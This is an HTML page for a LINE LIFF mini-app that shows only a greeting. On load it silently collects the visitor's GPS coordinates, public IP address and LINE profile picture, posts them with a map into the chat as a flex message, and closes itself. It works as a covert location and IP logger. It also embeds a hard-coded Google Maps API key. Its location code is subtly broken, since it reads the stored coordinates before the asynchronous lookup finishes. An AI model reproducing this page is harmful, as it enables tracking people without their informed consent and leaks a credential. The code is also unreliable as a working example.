<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LIFF - LINE Front-end Framework</title>
</head>

<body>
    <b>Hello From LIFF</b>

    <script charset="utf-8" src="https://static.line-scdn.net/liff/edge/versions/2.5.0/sdk.js"></script>
    <script>

        function getDateTime() {
            const date = new Date(Date.now())
            return date.toLocaleString()
        }

        async function getLocation() {
            navigator.geolocation.getCurrentPosition(function (position) {
                let lat = position.coords.latitude
                let lng = position.coords.longitude
                localStorage.setItem("MYLOC", JSON.stringify({ "lat": lat, "lng": lng }))
            })
            const theloc = localStorage.getItem("MYLOC")
            localStorage.removeItem("MYLOC")
            return theloc
        }


        async function getIP() {
            await fetch('https://api.ipify.org/?format=json')
                .then(results => results.json())
                .then(data => {
                    ip = data.ip
                    localStorage.setItem("MYIP", ip)
                })

            const theip = localStorage.getItem("MYIP")
            localStorage.removeItem("MYIP")
            return theip
        }



        async function main() {
            await liff.init({ liffId: "1656995427-Pn34wo4q" })
            const loc = await getLocation()
            const dates = getDateTime()
            const ip = await getIP()
            const profile = await liff.getProfile()
            const my_json_locate = JSON.parse(loc)


            await liff.sendMessages([{
                "type": "flex",
                "altText": "Flex Message",
                "contents": {
                    "type": "bubble",
                    "body": {
                        "type": "box",
                        "layout": "vertical",
                        "contents": [
                            {
                                "type": "box",
                                "layout": "horizontal",
                                "contents": [
                                    {
                                        "type": "box",
                                        "layout": "vertical",
                                        "contents": [
                                            {
                                                "type": "image",
                                                "size": "full",
                                                "aspectMode": "cover",
                                                "aspectRatio": "150:98",
                                                "gravity": "center",
                                                "url": `https://maps.googleapis.com/maps/api/staticmap?center=${my_json_locate.lat.toFixed(6)},${my_json_locate.lng.toFixed(6)}&zoom=15&size=400x400&markers=size:mid%7Ccolor:red%7C${my_json_locate.lat.toFixed(6)},${my_json_locate.lng.toFixed(6)}&maptype=hybrid&key=AIzaSyDPp1vNSk7TBo9FP7i1QPiB4Qq5tmNtk84`
                                            },
                                            {
                                                "type": "box",
                                                "layout": "vertical",
                                                "contents": []
                                            }
                                        ],
                                        "action": {
                                            "type": "uri",
                                            "label": "action",
                                            "uri": `https://www.google.com/maps/search/?api=1&query=${my_json_locate.lat.toFixed(6)}%2C${my_json_locate.lng.toFixed(6)}`
                                        }
                                    }
                                ]
                            },
                            {
                                "type": "box",
                                "layout": "horizontal",
                                "contents": [
                                    {
                                        "type": "box",
                                        "layout": "vertical",
                                        "contents": [
                                            {
                                                "type": "image",
                                                "url": profile.pictureUrl,
                                                "aspectMode": "cover",
                                                "size": "full"
                                            }
                                        ],
                                        "cornerRadius": "100px",
                                        "width": "72px",
                                        "height": "72px"
                                    },
                                    {
                                        "type": "box",
                                        "layout": "vertical",
                                        "contents": [
                                            {
                                                "type": "text",
                                                "contents": [
                                                    {
                                                        "type": "span",
                                                        "text": "Date",
                                                        "weight": "bold",
                                                        "color": "#000000"
                                                    },
                                                    {
                                                        "type": "span",
                                                        "text": "     "
                                                    },
                                                    {
                                                        "type": "span",
                                                        "text": dates
                                                    }
                                                ],
                                                "size": "sm",
                                                "wrap": true
                                            },
                                            {
                                                "type": "text",
                                                "contents": [
                                                    {
                                                        "type": "span",
                                                        "text": "Lat",
                                                        "weight": "bold",
                                                        "color": "#000000"
                                                    },
                                                    {
                                                        "type": "span",
                                                        "text": "     "
                                                    },
                                                    {
                                                        "type": "span",
                                                        "text": my_json_locate.lat.toFixed(6)
                                                    }
                                                ],
                                                "size": "sm",
                                                "wrap": true
                                            },
                                            {
                                                "type": "text",
                                                "contents": [
                                                    {
                                                        "type": "span",
                                                        "text": "Lng",
                                                        "weight": "bold",
                                                        "color": "#000000"
                                                    },
                                                    {
                                                        "type": "span",
                                                        "text": "     "
                                                    },
                                                    {
                                                        "type": "span",
                                                        "text": my_json_locate.lng.toFixed(6)
                                                    }
                                                ],
                                                "size": "sm",
                                                "wrap": true
                                            },
                                            {
                                                "type": "box",
                                                "layout": "baseline",
                                                "contents": [
                                                    {
                                                        "type": "text",
                                                        "text": "IP Adress : " + ip,
                                                        "size": "sm",
                                                        "color": "#bcbcbc"
                                                    }
                                                ],
                                                "spacing": "sm",
                                                "margin": "md"
                                            }
                                        ]
                                    }
                                ],
                                "spacing": "xl",
                                "paddingAll": "20px"
                            }
                        ],
                        "paddingAll": "0px"
                    }
                }
            }])
            liff.closeWindow()
        }
        main()
    </script>
</body>

</html>